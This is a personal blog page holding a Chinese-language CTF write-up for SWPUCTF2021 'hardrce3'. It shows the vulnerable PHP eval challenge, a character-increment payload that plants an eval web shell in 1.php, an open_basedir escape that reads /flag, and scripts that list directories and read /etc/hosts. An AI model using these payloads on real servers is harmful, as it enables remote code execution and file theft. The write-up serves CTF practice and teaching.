<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 4 | Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/26/SWPUCTF2021-hardrce3-wp/" >SWPUCTF2021-hardrce3-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-26
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/467">题目链接</a>   </p>
<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\^&#x27;</span>, <span class="string">&#x27;\~&#x27;</span>, <span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>异或和取反明显都不行 采用自增构造   尝试发现执行system无果   使用<code>file_put_contents</code>写木马到文件  </p>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/24/rce-noalpha/">无字母RCE</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;!&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%40&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B	</span><br><span class="line"><span class="comment"># assert($_POST[_])</span></span><br><span class="line"><span class="comment"># post _=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>访问<code>1.php</code>  执行phpinfo发现system, exec等函数都被禁用  并且设置了<code>open_basedir</code></p>
<p>绕过payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>); <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); <span class="keyword">print</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h2 id="open-basedir绕过脚本"><a href="#open-basedir绕过脚本" class="headerlink" title="open_basedir绕过脚本"></a>open_basedir绕过脚本</h2><p>获取目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$dir_array</span> = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///.*&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">sort</span>(<span class="variable">$dir_array</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir_array</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_array</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;glob:///.*&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_array</span>[] = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$dir_array</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir_array</span> <span class="keyword">as</span> <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/hosts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

